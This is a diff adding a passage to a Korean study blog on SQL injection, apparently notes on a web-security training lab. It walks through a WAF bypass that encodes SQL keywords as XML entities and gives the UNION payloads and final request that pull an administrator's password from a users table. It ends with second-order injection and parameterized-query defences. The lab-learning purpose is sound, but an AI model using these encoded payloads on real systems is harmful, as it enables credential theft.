@@ -1103,3 +1103,131 @@ Out-of-baand (OAST) 기술은 out-of-band 채널 내에서 직접적으로 데�
 
 # #SQL injection in different contexts
 
+이전의 랩에서 악의적인 SQL 페이로드를 삽입하기 위해 쿼리 스트링을 사용했다. 그러나, 애플리케이션에서 SQL 쿼리로 처리되는 제어 가능한 입력을 사용하여 SQL 인젝션 공격을 수행할 수 있다. 예를 들어, 어떤 웹사이트는 JSON이나 XML 형식으로 입력을 받고 이를 이용하여 데이터베이스에 쿼리를 한다.
+
+<br>
+
+```
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
+
+이러한 다양한 형식은 WAF 및 다른 방어 메커니즘 때문에 차단되는 공격을 난독화 할 수 있는 다양한 방법을 제공한다. 약한 구현은 요청 내에서 일반적인 SQL 인젝션 키워드를 찾는 경우가 많기에, 금지된 키워드에 있는 문자들을 인코딩하거나 이스케이프 처리하여 이러한 필터를 우회할 수 있다. 예를 들어, 위의 XML 기반 SQL 인젝션은 XML 이스케이프 시퀀스를 사용하여 `SELECT` 내에 있는 `S` 문자를 인코딩한다. 이는 서버 측에서 SQL 해석기로 전달되기 전에 복호화된다.
+
+<br>
+
+## 🚩Lab: SQL injection with filter bypass via XML encoding
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/ce11f7ac-a525-423c-94ed-6543508e8b54)
+
+물건의 재고를 조회할 때 요청하는 패킷을 보면 XML 형식으로 데이터를 보내는 것을 확인할 수 있다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/7deb4e42-6106-4634-a15d-81b6742eca56)
+b54)
+
+`storeId` 필드에 `SELECT 1`과 같은 SQL 쿼리를 삽입하여 요청을 보내면 위와 같이 필터링 되는 것을 알 수 있다.
+
+<br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/e4fb25cf-a412-4aed-8af7-f88073114593)
+
+버프스위트의 Decoder 기능을 통해 `SELECT` 문자열을 HTML 인코딩 하여 `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; 1`과 같이 쿼리를 만들어 요청을 다시 보내면 정상적으로 요청을 받는다.
+
+<br>
+
+이제 `users` 테이블에서 관리자의 패스워드를 조회해보자. 우선, 데이터를 추출하기 위해 `storeId` 필드의 값을 이용하여 수행하는 SQL문의 구조를 파악해보자. 아래와 같은 일련의 과정을 통해 구조를 파악하고 패스워드를 찾아내었다. 요청을 보낼 때 필터링 되는 문자들은 모두 인코딩하여 요청하였다.
+
+<br>
+
+1. `1' --`
+
+    정상적으로 재고를 조회하지 못하는 것으로 보아 storeId 필드가 문자열이 아니다.
+
+2. `1 --`
+
+    정상적으로 재고를 조회하지 하는 것으로 보아 storeId 필드는 숫자 데이터이다.
+
+3. `1 UNION SELECT NULL --`
+
+    ![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/2a258731-cee1-409e-9334-3d658f6b143d)
+
+    null을 출력하는 것으로 보아 해당 SQL문 결과의 컬럼 수는 1개이다.
+
+4. `1 UNION SELECT password FROM users WHERE username='administrator' --`
+
+    ![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/a639f7c8-146c-4fe8-a3f0-98ff3b87fb70)
+
+    administrator의 패스워드를 확인할 수 있다.
+
+<br>
+
+🔽 최종 XML 요청 값
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            1
+        </productId>
+        <storeId>
+            1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; password FROM users WHERE username=&#x27;administrator&#x27; &#x2d;&#x2d;
+        </storeId>
+    </stockCheck>
+```
+
+<br><br>
+
+# #Second-order SQL injection
+
+1차 SQL 인젝션은 애플리케이션이 HTTP 요청의 사용자 입력을 처리하고 해당 입력을 안전하지 않은 방식으로 SQL 쿼리에 통합될 때 발생한다.
+
+2차 SQL 인젝션은 애플리케이션이 HTTP 요청의 사용자 입력을 갖고 나중에 사용하기 위해 저장할 때 발생한다. 이는 입력 값을 데이터베이스에 배치하여 수행되는데, 데이터가 저장되는 시점에는 취약점이 발생하지 않는다. 이후에 다양한 HTTP 요청을 다룰 때, 애플리케이션이 저장된 데이터를 조회하고 안전하지 않은 방식으로 SQL 쿼리에 통합한다. 이러한 이유로 2차 SQL 인젝션은 stored SQL 인젝션으로 알려져 있다.
+
+<br>
+
+2차 SQL 인젝션은 개발자가 SQL 인젝션 취약점을 인지하고 데이터베이스에 대한 입력의 초기 배치를 안전하게 처리하는 상황에서 자주 발생한다. 데이터가 나중에 처리되면 이전에 데이터베이스에 안전하게 보관했기 때문에 안전하다고 간주된다. 이 시점에 개발자는 데이터가 신뢰할 수 있는 것으로 잘못 간주하기 때문에 데이터는 안전하지 않은 방식으로 처리된다.
+
+<br><br>
+
+# #How to prevent SQL injection
+
+쿼리 내에 문자열을 연결하는 대신, 파라미터화 된 쿼리를 사용하여 대부분의 SQL 인젝션 사례를 방지할 수 있다. 이렇게 파라미터화된 쿼리는 "prepared statements"라고 알려져 있다.
+
+<br>
+
+```
+String query = "SELECT * FROM products WHERE category = '"+ input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);
+```
+
+위의 코드는 사용자 입력을 쿼리에 바로 연결시키기 때문에 SQL 인젝션에 취약하다.
+
+<br>
+
+```
+PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();
+```
+
+사용자 입력 값이 쿼리 구조를 방해하지 않도록 이 코드를 위와 같은 방식으로 다시 작성할 수 있다.
+
+<br>
+
+`WHERE`절과 `INSERT` 혹은 `UPDATE`문 내의 값을 포함하여 신뢰할 수 없는 입력이 쿼리 내의 데이터로 나타나는 모든 상황에 대해 매개변수화된 쿼리를 사용할 수 있다. 테이블이나 컬럼 이름, `ORDER BY`절과 같은 쿼리의 다른 부분에서 신뢰할 수 없는 입력을 처리하는 데는 사용할 수 없다. 신뢰할 수 없는 데이터를 이러한 쿼리의 일부분으로 배치하는 애플리케이션 기능은 다음과 같은 다른 방법으로 접근할 필요가 있다.
+
+- 허용된 입력 값을 화이트리스트에 추가
+- 필요한 동작을 제공하기 위해 다양한 논리 사용
+
+<br>
+
+파라미터화된 쿼리가 SQL 인젝션을 방지하기 위해 효과적이기 위해서는 쿼리 내에 사용되는 문자열은 반드시 하드 코딩된 상수이어야 한다. 이는 어떤 출처의 변수 데이터도 포함하면 안된다. 데이터 항목을 신뢰할 수 있는지 여부를 사례별로 결정하려는 유혹에 빠지지 말고 안전한 것으로 간주되는 사례에 대해 쿼리 내에서 문자열 연결을 계속 사용해야 한다. 이는 데이터의 출처에 대해 실수하거나 다른 코드를 변경하여 신뢰할 수 있는 데이터를 오염시키기 쉽다.
+
+<br><br>
+
+![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/4749c052-c288-44e1-b2c4-be0a46e334d8)
